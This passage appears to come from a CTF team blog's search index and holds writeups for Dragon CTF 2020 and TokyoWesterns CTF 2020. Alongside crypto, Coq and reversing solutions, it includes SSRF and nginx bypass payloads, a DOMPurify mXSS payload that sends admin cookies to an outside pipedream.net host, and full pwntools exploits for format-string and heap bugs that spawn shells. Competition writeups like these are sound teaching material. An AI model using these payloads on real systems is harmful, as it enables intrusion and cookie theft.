0xb9d751533593ac10cdfb7b8e03cad8babc67d8eaeac0a3699b82857dacac938c.\nUnfortunately it is not. Luckily there are many inputs (available on the Bitcoin network) that generates eight trailing null bytes as its hash. We can simply look at the blocks and find the one we need. For me, I was using the block API from blockcypher.com to retrieve and compute the preimage of hashes. Eventually block 657972 satisfies our needs and the Alice's secret key will be $a = 0$.\nThat said, the AES key would be 00 00 ... 00 05 38 when $a = 0$ - and we are able to decrypt the flag: DrgnS{B1tc0in_p0w3r_crypt0_brut3}! :tada:\nFrying in motion (Crypto, 324 points) Solved by Mystiz.\nChallenge Summary The challenge is simple. Upon connecting to the challenge server,\n 257 HEX characters are generated, strfry-ed for 0x140000 times. Nothing is returned. (This took around 5 seconds) Players are allowed to send up to 4096 bytes. The server returns the strfry-ed input. 64 HEX characters (denote as fry_buf) strfry-ed and returned. The player is expected to find fry_buf.  More importantly, the challenge server has a timeout of 20 seconds. Hence, you have to compute from the strfry-ed response in 15 seconds.\nSolution Part I: The first encounter  \u0026quot;WTF. Yet another strfry question? It must be very boring.\u0026quot; ~ Mystiz\n This is the first comment I made to the challenge. It is actually much interesting than I thought and I have spent a good 5 hours for the challenge.\nThe previous CTFs (for example, challenge from ångstromCTF 2020 and DawgCTF 2020) exploited on the small seed space that can be exhausted. In the previous versions of libc, the seeds for strfry is given by time(NULL) ^ getpid(). I was trying to print time(NULL) and getpid() alongside with the strfry result, but the seed does not check out. What? Maybe the world is not peaceful anymore in libc 2.31-0ubuntu9. Let's download the source code and have a read.\nPart II: Code-reading game Let's verify the first point - is the implementation for strfry changed?\n// string/strfry.c  char * strfry (char *string) { // omitted...  if (!init) { static char state[32]; rdata.state = NULL; __initstate_r (random_bits (), state, sizeof (state), \u0026amp;rdata); init = 1; } // omitted... }// include/random-bits.h  static inline uint32_t random_bits (void) { struct timespec tv; __clock_gettime (CLOCK_MONOTONIC, \u0026amp;tv); /* Shuffle the lower bits to minimize the clock bias. */ uint32_t ret = tv.tv_nsec ^ tv.tv_sec; ret ^= (ret \u0026lt;\u0026lt; 24) | (ret \u0026gt;\u0026gt; 8); return ret; } Although the string is fried in the same way, the seed is changed! Since the seed is 32 bits long, maybe I can just exhaust it. However it takes 5 seconds to strfry a 257-byte long string for 0x140000 times, it is not feasible to brute force with the challenge implementation. Let's read how random numbers are generated.\n// stdlib/random_r.c  int __initstate_r (unsigned int seed, char *arg_state, size_t n, struct random_data *buf) { // omitted...  int type; if (n \u0026gt;= BREAK_3) type = n \u0026lt; BREAK_4 ? TYPE_3 : TYPE_4; else if (n \u0026lt; BREAK_1) { if (n \u0026lt; BREAK_0) goto fail; type = TYPE_0; } else type = n \u0026lt; BREAK_2 ? TYPE_1 : TYPE_2; int degree = random_poly_info.degrees[type]; int separation = random_poly_info.seps[type]; buf-\u0026gt;rand_type = type; buf-\u0026gt;rand_sep = separation; buf-\u0026gt;rand_deg = degree; int32_t *state = \u0026amp;((int32_t *) arg_state)[1];\t/* First location. */ /* Must set END_PTR before srandom. */ buf-\u0026gt;end_ptr = \u0026amp;state[degree]; buf-\u0026gt;state = state; __srandom_r (seed, buf); state[-1] = TYPE_0; if (type != TYPE_0) state[-1] = (buf-\u0026gt;rptr - state) * MAX_TYPES + type; // omitted... } strfry uses a 32-byte state, which indicates that TYPE_1 PRNG is used. Seven 32-bit unsigned integer is derived from the seed (denote it as s[0], s[1], ..., s[6]) and set the counter c := 0. This is the equivalent Python code.\nclass GlibcRandom: def __init__(self, seed): self.init_state(seed) [self.next() for _ in range(70)] def init_state(self, seed): state = [seed] for i in range(1, 7): h, l = seed // 127773, seed % 127773 seed = (16807 * l - 2836 * h) \u0026amp; 0x7fffffff state.append(seed) self.state = [ state, 0 ] def next(self): s, t = self.state v = (s[(t+3) % 7] + s[t % 7]) \u0026amp; 0xffffffff v \u0026gt;\u0026gt;= 1 s[(t+3) % 7] += s[t % 7] s[(t+3) % 7] \u0026amp;= 0xffffffff self.state = [s, (t + 1) % 7] return v Part III: Fast-forwarding the states Fast-forwarding the PRNG is easy. This is similar on the Team Trees challenge in CONFidence CTF this year. We can skip states with the matrix implementation (and I am able to skip the details for this part, too). After all, 5M seeds can be checked per second. Since we have only 15 seconds to recover the seed, we are unable to find the entire search space (only 1.75% of the seed space is checked). In average, we can recover the seed from the strfry output in 15 seconds once every 60 times. Finally, if we are able to recover the seed, we can freely fry and unfry strings.\nAfter two hours, we have the flag: DrgnS{Fr13d_57r1Ng5_4r3_tH3_Be5t_s7r1NgS!}.\nbabykok (Misc, 215 points) Solved by GeoffreyY.\nWe simply have to solve some theorems using Coq.\nGood thing I have written some lean before, so learning / writing Coq isn't that difficult.\nFor the first part we have to solve the following 6 theorems in some random order.\nI'd like to thank my teammate @ozetta for finding this powerful coq tactic intuition, and @harrier_lcc for showing us his coq and how to use it.\nThis would\u0026rsquo;ve taken a lot longer if we didn\u0026rsquo;t watch him livestreaming playing around with his coq. His coq is very very nah that\u0026rsquo;s it I\u0026rsquo;m done with the jokes.  Theorem problem0: forall A B : Prop, A \\/ B -\u0026gt; B \\/ A. \u0026gt;\u0026gt;\u0026gt; intuition.Theorem problem1: forall A B C D : Prop, (A -\u0026gt; B) /\\ (C -\u0026gt; D) /\\ A /\\ C -\u0026gt; B /\\ D. \u0026gt;\u0026gt;\u0026gt; intuition.Theorem problem2: forall A B : Type, ((((A -\u0026gt; B) -\u0026gt; A) -\u0026gt; A) -\u0026gt; B) -\u0026gt; B. \u0026gt;\u0026gt;\u0026gt; intuition. We actually have to do some work with the remaining 3 starter problems:\nTheorem problem3: forall b1 b2 : bool, negb (b1 \u0026amp;\u0026amp; b2) = (negb b1 || negb b2)%bool. \u0026gt;\u0026gt;\u0026gt; intros. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 10) b1, b2 : bool ============================ negb (b1 \u0026amp;\u0026amp; b2) = (negb b1 || negb b2)%bool The general idea for all of these proofs is to apply induction to split the proof into smaller, simple cases.\n\u0026gt;\u0026gt;\u0026gt; induction b1. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 14) b2 : bool ============================ negb (true \u0026amp;\u0026amp; b2) = (negb true || negb b2)%bool subgoal 2 (ID 15) is: negb (false \u0026amp;\u0026amp; b2) = (negb false || negb b2)%bool \u0026gt;\u0026gt;\u0026gt; auto. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; auto.Theorem problem4: forall (C : Prop) (T : Set) (B : T -\u0026gt; Prop), (exists x : T, C -\u0026gt; B x) -\u0026gt; C -\u0026gt; exists x : T, B x. \u0026gt;\u0026gt;\u0026gt; intros. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 23) C : Prop T : Set B : T -\u0026gt; Prop H : exists x : T, C -\u0026gt; B x H0 : C ============================ exists x : T, B x \u0026gt;\u0026gt;\u0026gt; induction H. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 30) C : Prop T : Set B : T -\u0026gt; Prop x : T H : C -\u0026gt; B x H0 : C ============================ exists x0 : T, B x0 \u0026gt;\u0026gt;\u0026gt; apply H in H0. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 31) C : Prop T : Set B : T -\u0026gt; Prop x : T H : C -\u0026gt; B x H0 : B x ============================ exists x0 : T, B x0 \u0026gt;\u0026gt;\u0026gt; exists x. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 34) C : Prop T : Set B : T -\u0026gt; Prop x : T H : C -\u0026gt; B x H0 : B x ============================ B x \u0026gt;\u0026gt;\u0026gt; assumption. Instead of explicitly using apply H in H0., I've now discovered that the following simpler proof also works:\nintros. induction H. exists x. auto. We have to deal with natural numbers for the final starter problem, which we can also solve using induction:\nTheorem problem5: forall m n : nat, m + n = n + m. \u0026gt;\u0026gt;\u0026gt; intros. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; induction m. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 14) n : nat ============================ 0 + n = n + 0 subgoal 2 (ID 18) is: S m + n = n + S m \u0026gt;\u0026gt;\u0026gt; auto. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 18) m, n : nat IHm : m + n = n + m ============================ S m + n = n + S m \u0026gt;\u0026gt;\u0026gt; simpl. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 21) m, n : nat IHm : m + n = n + m ============================ S (m + n) = n + S m \u0026gt;\u0026gt;\u0026gt; rewrite IHm. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 22) m, n : nat IHm : m + n = n + m ============================ S (n + m) = n + S m \u0026gt;\u0026gt;\u0026gt; auto. There are only 2 more problems after the starter 6.\nnice warmup, lets do some math! Require Import Arith.Mult. Theorem math_problem: forall m n, (n + m) * (n + m) = n * n + 2 * n * m + m * m. The idea with this one is simply to expand both sides, and let the theorem prover see that both sides have the same terms.\n\u0026gt;\u0026gt;\u0026gt; intros. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; simpl. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 13) m, n : nat ============================ (n + m) * (n + m) = n * n + (n + (n + 0)) * m + m * m \u0026gt;\u0026gt;\u0026gt; rewrite mult_plus_distr_r. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; rewrite mult_plus_distr_r. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 15) m, n : nat ============================ n * (n + m) + m * (n + m) = n * n + (n * m + (n + 0) * m) + m * m \u0026gt;\u0026gt;\u0026gt; rewrite mult_plus_distr_l. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; rewrite mult_plus_distr_l. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 17) m, n : nat ============================ n * n + n * m + (m * n + m * m) = n * n + (n * m + (n + 0) * m) + m * m \u0026gt;\u0026gt;\u0026gt; rewrite plus_assoc. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; rewrite plus_assoc. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 19) m, n : nat ============================ n * n + n * m + m * n + m * m = n * n + n * m + (n + 0) * m + m * m \u0026lt;\u0026lt;\u0026lt; rewrite plus_0_r. \u0026gt;\u0026gt;\u0026gt; 1 subgoal (ID 20) m, n : nat ============================ n * n + n * m + m * n + m * m = n * n + n * m + n * m + m * m \u0026lt;\u0026lt;\u0026lt; firstorder. firstorder didn't work on my machine but worked on the server ¯\\_(ツ)_/¯\nThe final question took us a while:\ngj, now something more interesting, can you prove my code works? Require Import Le. Section last_stage. Variable A : Type. Inductive list : Type := | nil : list | cons : A -\u0026gt; list -\u0026gt; list. Fixpoint nth (l : list) (n : nat) : option A := match n,l with | 0, cons x xs =\u0026gt; Some x | S n, cons _ xs =\u0026gt; nth xs n | _, _ =\u0026gt; None end. Fixpoint length (l:list) : nat := match l with | nil =\u0026gt; 0 | cons _ xs =\u0026gt; 1 + length xs end. Theorem nth_in: forall (n:nat) (l:list), n \u0026lt; length l -\u0026gt; exists a: A, nth l n = Some a. The idea for this is induction on both n and l. It should be easy for the base cases of n is 0, or l is nil, and induction completes the rest of the proof.\n\u0026gt;\u0026gt;\u0026gt; intros. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; revert H. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; revert n. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 15) A : Type l : list ============================ forall n : nat, n \u0026lt; length l -\u0026gt; exists a : A, nth l n = Some a \u0026gt;\u0026gt;\u0026gt; induction l. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 19) A : Type ============================ forall n : nat, n \u0026lt; length nil -\u0026gt; exists a : A, nth nil n = Some a subgoal 2 (ID 23) is: forall n : nat, n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) n = Some a0 \u0026gt;\u0026gt;\u0026gt; inversion 1. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 23) A : Type a : A l : list IHl : forall n : nat, n \u0026lt; length l -\u0026gt; exists a : A, nth l n = Some a ============================ forall n : nat, n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) n = Some a0 \u0026gt;\u0026gt;\u0026gt; induction n. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 50) A : Type a : A l : list IHl : forall n : nat, n \u0026lt; length l -\u0026gt; exists a : A, nth l n = Some a ============================ 0 \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) 0 = Some a0 subgoal 2 (ID 53) is: S n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) (S n) = Some a0 \u0026gt;\u0026gt;\u0026gt; simpl. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 84) ... 0 \u0026lt; S (length l) -\u0026gt; exists a0 : A, Some a = Some a0 ... \u0026gt;\u0026gt;\u0026gt; intro. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 60) ... exists a0 : A, Some a = Some a0 ... \u0026gt;\u0026gt;\u0026gt; exists a. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; auto. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 53) A : Type a : A l : list IHl : forall n : nat, n \u0026lt; length l -\u0026gt; exists a : A, nth l n = Some a n : nat IHn : n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) n = Some a0 ============================ S n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) (S n) = Some a0 \u0026gt;\u0026gt;\u0026gt; simpl. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 68) A : Type a : A l : list IHl : forall n : nat, n \u0026lt; length l -\u0026gt; exists a : A, nth l n = Some a n : nat IHn : n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) n = Some a0 ============================ S n \u0026lt; S (length l) -\u0026gt; exists a0 : A, nth l n = Some a0 \u0026gt;\u0026gt;\u0026gt; auto with arith. Finally we have the flag:\ngj flag: DrgnS{xxxx_my_c0q_for_4_flag_17bcbc34b7c565a766e335}\n","permalink":"https://b6a.black/posts/2020-11-23-dragonctf/","summary":"Dragon CTF 2020 is definitely had my best CTF moments. There are big brain moments and I have been mind-blown for multiple times during the game. This time we have teamed up with @blackb6a. I have solved all the crypto challenges and two challenges with my teammates.\nThere are three challenges writeup in this post:\n Bit Flip (parts 2 and 3) Frying in motion babykok  Bit Flip (Crypto, 155+324+343 points) Solved by Mystiz.","title":"Dragon CTF 2020 Writeup"},{"content":"urlcheck v1 (Web, 98 points) Solved by Ozetta.\nObjective: SSRF http://127.0.0.1/admin-status The input needs to fulfil the pattern '\\A(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)\\Z' and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, int(\u0026quot;0177\u0026quot;) is still 177 instead of 127 in Python, so we can use http://0177.0.0.1/admin-status\nurlcheck v2 (Web, 128 points) Solved by Ozetta.\nObjective: SSRF http://localhost/admin-status Standard TOCTOU bug, just use DNS rebinding to get access: http://23bbd91c.7f000001.rbndr.us/admin-status\nAngular of the Universe, part one (Web, 139 points) Solved by Ozetta.\nObjective of flag 1 is to access /debug/answer route in Angular through the nginx proxy, but debug is filtered and /debug is blocked in nginx. In nginx, the condition checking is done after path normalization, but the request path is sent to the proxy directly. So /debug/answer/../.. will pass the filter in nginx. To let Angular avoid the latter paths, we can use double slashes, which is used to separate secondary routes. To bypass the checking in server.ts, use d%65bug instead of debug. Finally, we need some gibberish at the end of the path to avoid redirect, which gives this payload: GET /d%65bug/answer//../../a HTTP/1.1\nbfnote (Web, 320 points) Solved by harrier and Ozetta.\nDuring the CTF, cure53 has attempted to patch a mXSS. In particular, the test case in the commit contains a valid payload exploiting the older versions of DOMPurify: \u0026lt;math\u0026gt;\u0026lt;mtext\u0026gt;\u0026lt;table\u0026gt;\u0026lt;mglyph\u0026gt;\u0026lt;style\u0026gt;\u0026lt;math\u0026gt;CLICKME\u0026lt;/math\u0026gt;.\nEventually we have constructed the following payload to steal cookies from the admin:\n\u0026lt;math\u0026gt;\u0026lt;mtext\u0026gt;\u0026lt;table\u0026gt;\u0026lt;mglyph\u0026gt;\u0026lt;style\u0026gt;\u0026lt;math\u0026gt;\u0026lt;img src=//7a58976474871f9e062175cbd8755cbc.m.pipedream.net/q onerror=location=this.src+document.cookie\u0026gt;\u0026lt;/math\u0026gt; nothing more to say 2020 (Pwn, 111 points) Solved by cire meat pop.\nThis is a typical challenge on the format string vulnerability. Since NX protection is disabled, it should be possible to overwrite the return address to shellcode that is located on stack. Hence, stack address can be leaked and the return address can be overwritten.\np = remote(\u0026#39;pwn02.chal.ctf.westerns.tokyo\u0026#39;, 18247) def fmtp(payload): p.sendline(payload) return p.recvuntil(\u0026#39;\u0026gt; \u0026#39;)[:-3] p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) payload = \u0026#34;%28$p\u0026#34; leak = int(fmtp(payload),16) stack = leak-0x118 ret = stack+0x108 payload = \u0026#34;%7$s||||\u0026#34;+p64(stack) payload = fmtstr.fmtstr_payload(6, {ret: stack+8}, write_size=\u0026#39;byte\u0026#39;) fmtp(payload) payload = \u0026#39;q\u0026#39;*8 + asm(shellcraft.amd64.linux.sh()) p.sendline(payload) p.interactive() We have the flag: TWCTF{kotoshi_mo_hazimarimasita_TWCTF_de_gozaimasu}. Translating via google: This is TWCTF, which has begun. Where has kotoshi gone?\nOnline Nonogram (Pwn, 252 points) Solved by cire meat pop.\nThe vulnerability is that we can overwrite the vector pointer to maze chunks.\nFirst leak heap info, then forge a vector to read the unsortbin pointer. Finally, overwrite free hook with system function by tcache attack and trigger it with /bin/sh.\np = remote(\u0026#39;pwn03.chal.ctf.westerns.tokyo\u0026#39;, 22915) def calc(off): return int(((off+8-1)*8)**0.5)+1 def dele(index): p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;3\u0026#39;) p.sendlineafter(\u0026#39;Index\u0026#39;,str(index)) p.recvuntil(\u0026#39;Success\u0026#39;) def add(title, size, payload): p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;Title: \u0026#39;, title) p.sendlineafter(\u0026#39;Size: \u0026#39;, str(size)) p.sendafter(\u0026#39;Puzzle: \u0026#39;, payload) def leakp(index): p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;Index\u0026#39;,str(index)) p.recvuntil(\u0026#39;Row\\\u0026#39;s Numbers\\n\u0026#39;) a = p.recvuntil(\u0026#39;\\nColumn\\\u0026#39;s Numbers\u0026#39;)[:-17] p.sendlineafter(\u0026#39;:\u0026#39;,\u0026#39;q\u0026#39;) p.recvuntil(\u0026#39;invalid choice\u0026#39;) return a # leak heap info offset = 0x400 add(\u0026#39;test2\u0026#39;, calc(offset), \u0026#39;\\0\u0026#39;*offset) leak = leakp(2).replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;)[2:][::-1][32:] heap = int(leak,2) log.info(\u0026#39;leak: {}\u0026#39;.format(hex(heap))) target = heap+0x60 new_heap = heap+0x520 heap_base = heap-0x11f90 # add padding to prevent freed large chunk consolidate with top chunk  add(\u0026#39;pad\u0026#39;, 0x10, \u0026#39;\\n\u0026#39;) dele(2) # forge vector and maze chunk forged_chunk1 = new_heap+0xb0 forged_chunk2 = new_heap+0xe0 forged = flat(new_heap+0x40,new_heap+0x90,0,0,0,0,0,0x41) forged+= flat(0, target, target, 6,6,6,6,1,0x81) forged+= flat(0x81, 5, forged_chunk1, forged_chunk2, 0x81,6,6,6,1,0) forged+= flat(0x81)+ p64(0x81)*40+p64(0x121)*20 forged = forged.ljust(0x400,\u0026#39;\\0\u0026#39;) forged+= flat(new_heap, new_heap+0x10, new_heap+0x38) add(\u0026#39;forged\u0026#39;, 0x70, forged) # leak libc info p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;4\u0026#39;) p.recvuntil(\u0026#39;0 : \u0026#39;) leak = u64(p.recv(6)+\u0026#39;\\0\\0\u0026#39;) libc_base = leak-0x1ebfd0 log.info(\u0026#39;libc_base: {}\u0026#39;.format(hex(libc_base))) p.sendlineafter(\u0026#39;Index\u0026#39;,\u0026#39;-1\u0026#39;) # free overlapped chunk to tcache  dele(1) add(\u0026#39;a\u0026#39;, 50, \u0026#39;a\u0026#39;) add(\u0026#39;whatever\u0026#39;, 30, \u0026#39;v\u0026#39;*0x48+p64(0x81)+p64(libc_base+libc.symbols[\u0026#39;__free_hook\u0026#39;])) add(\u0026#39;whatever\u0026#39;, 30, \u0026#39;whatever\u0026#39;) # write system to free hook add(\u0026#39;q\u0026#39;, 30, p64(libc_base+libc.symbols[\u0026#39;system\u0026#39;])) # trigger free hook p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;Title: \u0026#39;, \u0026#39;/bin/sh\\x00\u0026#39;+\u0026#39;\\0\u0026#39;*0x100) p.interactive() Flag: TWCTF{watashi_puzzle_daisuki_mainiti_yatteru}. Translating via google: I'm pu → I love you. WTF?\nReversing iS Amazing (Reverse, 126 points) Solved by Mystiz.\nOpen the binary with IDA. We can see that the binary signs argv[1] (which should be the flag) with RSA, then compares the signature with a given value. With that said, we have a RSA private key.\nSince we have the private key and the target signature (which the message is signed instead of its digest), we can simply recover the message by computing $s^e\\ \\text{mod}\\ n$. Unpadding the message we have TWCTF{Rivest_Shamir_Adleman}.\nTamarin (Reverse, 224 points) Solved by harrier and Mystiz.\nWe are given an APK for the challenge. As how we work on every single Android reversing challenge, we use apktool to decode the file. Noticing that it is developed in Xamarin, we use the Github repository tjg1/mono_unbundle to unbundle dll.so to a C# DLL source file. We now have source codes to read!\nIn particular we have this function:\npublic static bool Func4(string flag) { ParallelOptions parallelOptions = new ParallelOptions { MaxDegreeOfParallelism = 4 }; byte[] bytes = Encoding.ASCII.GetBytes(flag); int length = flag.Length; if ((length \u0026amp; 3) != 0) { Array.Resize\u0026lt;byte\u0026gt;(ref bytes, length + (4 - (length \u0026amp; 3))); } for (int i = length; i \u0026lt; bytes.Length; i++) { bytes[i] = 0; } if (bytes.Length != Check.equations_arr.GetLength(0) * 4) { return false; } object lockObj = new object(); ConcurrentBag\u0026lt;bool\u0026gt; checkResults = new ConcurrentBag\u0026lt;bool\u0026gt;(); List\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt; list = new List\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt;(); for (int j = 0; j \u0026lt; Check.equations_arr.GetLength(0); j++) { List\u0026lt;uint\u0026gt; list2 = new List\u0026lt;uint\u0026gt;(); list2.Add(BitConverter.ToUInt32(bytes, j * 4)); for (int k = 0; k \u0026lt; Check.equations_arr.GetLength(1); k++) { list2.Add(Check.equations_arr[j, k]); } list.Add(list2); } Parallel.ForEach\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt;(list, parallelOptions, delegate(List\u0026lt;uint\u0026gt; equation) { object lockObj = lockObj; lock (lockObj) { uint num = Check.Func3(); for (int l = 0; l \u0026lt; 10000; l++) { num = Check.Func2(equation, num, equation.Count - 2); } checkResults.Add(num == equation[equation.Count - 1]); } }); return Enumerable.All\u0026lt;bool\u0026gt;(checkResults.ToArray(), (bool x) =\u0026gt; x); } Additionally, we have a equations_arr which is a $22\\times32$ matrix. After a bit of reversing, this is how we interpreted the challenge (everything is taken modulo 232):\nFirst we define $m_i$ be the $i$-th block (of 4 bytes) extracted from the flag. Define also the function $f_i$ such that $f_i(x) := m_i + a_{i,1} x + a_{i,2} x^2 + ... + a_{i,31} x^{31}$. The objective is to find $m_i$ such that $a_{i,32} = f_i^{(10000)}(n)$ for all $i = 1, 2, ..., 22$.\nWhat's $n$? It is the output of Check.Func3() and it actually is a random number... Is it even solvable?\n Turns out it is. We notice that $a_{ij}$ is an even number for $i=1, 2, ..., 22$ and $j=1, 2, ..., 31$. With a bit of deduction (a bit means few sheets of paper and a lot of time), we are able to derive a function $g_i$ such that $f_i^{(10000)}(n) = g_i(m_i)$ for all $n$, i.e., this would be a constant.\nAfter all, the last thing is to compute $m_i$. We have the full flag solving $g_i(m_i) = a_{i,32}$:\nTWCTF{Xm4r1n_15_4bl3_70_6en3r4t3_N471v3_C0d3_w17h_VS_3n73rpr153_bu7_17_c0n741n5_D07_N3t_B1n4ry} easy-hash (Crypto, 75 points) Solved by Mystiz.\nThe challenge defines a new hash algorithm, easy_hash. It is defined by the following function:\ndef easy_hash(x): m = 0 for i in range(len(x) - 3): m += struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, x[i:i + 4])[0] m = m \u0026amp; 0xffffffff return m The objective is to find a collision pair: for twctf: please give me the flag of 2020\nMathematically, if $M=m_1m_2m_3\\dots m_n$, then\n\\[\\text{easy\\_hash}(M):=\\sum_{i=1}^{n-3}\\left(\\text{0x100}^3m_{i+3}+\\text{0x100}^2m_{i+2}+\\text{0x100}m_{i+1}+m_i\\right).\\]\nEquivalently it would be\n\\[ \\begin{aligned} \\text{easy\\_hash}(M) := m_1\u0026 + \\text{0x101} m_2 + \\text{0x10101} m_3 + \\text{0x1010101}\\sum_{i=4}^{n-3}m_i \\\\ \\end{aligned} \\]\nHence, the characters in the middle have the weight 0x1010101 for hash computing. Knowing that \u0026quot;f\u0026quot; = \u0026quot;F\u0026quot; + \u0026quot; \u0026quot;, we can simply replace flag into F lag.\n$ curl \u0026#34;https://crypto01.chal.ctf.westerns.tokyo/\u0026#34; -X POST --data \u0026#34;twctf: please give me the F lag of 2020\u0026#34; # Congrats! The flag is TWCTF{colorfully_decorated_dream} sqrt (Crypto, 216 points) Solved by Mystiz.\nIn this challenge, we are given a ciphertext and a prime $p$. The ciphertext $c$ is computed from the message $m$ by $c \\equiv m^{2^{64}}\\ (\\text{mod}\\ p)$ - and the objective is of course to recover the flag $m$.\nMy first attempt is to repeatedly use Tonelli-Shanks 64 times to compute modular square roots. However, it basically takes forever because the number of candidates could double when it go deeper by one level. This means that we will get two candidates for $c^{1/2}$, four candidates for $c^{1/4}$ and so on. The number grows exponentially and definitely would not be feasible.\nFortunately, we can compute $m^{2^{30}}$ from $m^{2^{64}}$ without any hassle. Knowing that $p - 1 = 2^{30}q$, we can compute $d$ for $2^{34}d \\equiv 1\\ (\\text{mod}\\ p-1)$. Then $c^d \\equiv m^{d\\cdot 2^{64}}\\equiv m^{2^{30}}\\ (\\text{mod}\\ p)$. Then we can use Tonelli-Shanks for 30 times for the flag... Nope. That is still too slow.\nInstead we compute a 230-th root of unity modulo $p$ (denote it as $r$). If we have an candidate $m_0$ such that $c \\equiv {m_0}^{2^{64}}$, then the $m$ we want is any of the $m_0, rm_0, r^2m_0, ..., r^{2^{64}-1}m_0$, under modulo $p$. We can easily iterate through. It took me around fifteen minutes to compute the flag - TWCTF{17s_v3ry_34sy_70_f1nd_th3_n_7h_r007}.\ntwin-d (Crypto, 172 points) Solved by harrier and Mystiz.\nThis is a RSA challenge. Given a common modulus $n$, a pair of public keys are given such that their private exponents differ by two. Simply put,\n\\[ \\begin{cases}\\begin{aligned} e_2 (d+2) \u0026\\equiv 1\\ \\left(\\text{mod}\\ \\phi(n)\\right) \\\\ e_1 d \u0026\\equiv 1\\ \\left(\\text{mod}\\ \\phi(n)\\right) \\end{aligned}\\end{cases}. \\]\nharrier has observed that $e_2d \\equiv 1 - 2e_2$. With this, we can deduce a congruence relation that does not depend on $d$:\n\\[0 \\equiv e_1(e_2d) - e_2(e_1d) \\equiv e_1(1-2e_2)-e_2 \\equiv e_1 - e_2 - 2e_1e_2\\ \\left(\\text{mod}\\ \\phi(n)\\right).\\]\nIn this case, $e_1 - e_2 - 2e_1e_2$ will be a multiple of $\\phi(n)$. We can compute an equivalent private key $d'$ by computing $ed' \\equiv 1 \\ \\left(\\text{mod}\\ \\phi(n)\\right)$. Hence it suffices to recover the flag from the ciphertext - TWCTF{even_if_it_is_f4+e}.\nThe Melancholy of Alice (Crypto, 242 points) Solved by Mystiz.\nIn this challenge, we are asked to exploit ElGamal cryptosystem. The code supplied is responsible for generating key and encrypting the flag.\nN = 1024 def generateKey(): p = getStrongPrime(N) q = (p - 1) // 2 x = getRandomRange(2, q) g = 2 h = pow(g, x, p) pk = (p, q, g, h) sk = x return (pk, sk) def encrypt(m, pk): (p, q, g, h) = pk r = getRandomRange(2, q) c1 = pow(g, r, p) c2 = m * pow(h, r, p) % p return (c1, c2) Since everything looked pretty legit, we were stuck. Since $p$ is strong, if we write $p := 2q + 1$ then $q$ would be a prime. Alas, the prime is of 1024 bits long. The challenge is very secure, isn't it?\nWithout any clues, we were messing around. Eventually we tried to factorize $p-1$.\n  Wait what? Isn't $p$ a strong prime? Why are there so many factors? Turns out we have messed up the definition of strong prime. A strong prime $p$ is basically a prime with $p-1$ having a large prime factor. The desired $p$ they want should be safe but not strong.\nOkay, back on business. I used $r = 5710354319$ that is a factor of $p-1$. Then the remaining would be easy with discrete logarithm.\n# p, q, g, h are redacted to save up some spaces with open(\u0026#39;challenge/ciphertext.txt\u0026#39;) as f: cs = list(map(eval, f.read().strip().split(\u0026#39;\\n\u0026#39;))) r = 5710354319 assert (p-1) % r == 0 x = dlog.bsgs(pow(g, (p-1)//r, p), pow(h, (p-1)//r, p), p, r) assert pow(g, x * (p-1)//r, p) == pow(h, (p-1)//r, p) ms = b\u0026#39;\u0026#39; m_map = list(map(lambda m: pow(m, (p-1)//r, p), range(0x20, 0x80))) print(m_map) for c1, c2 in cs: c1 = pow(c1, 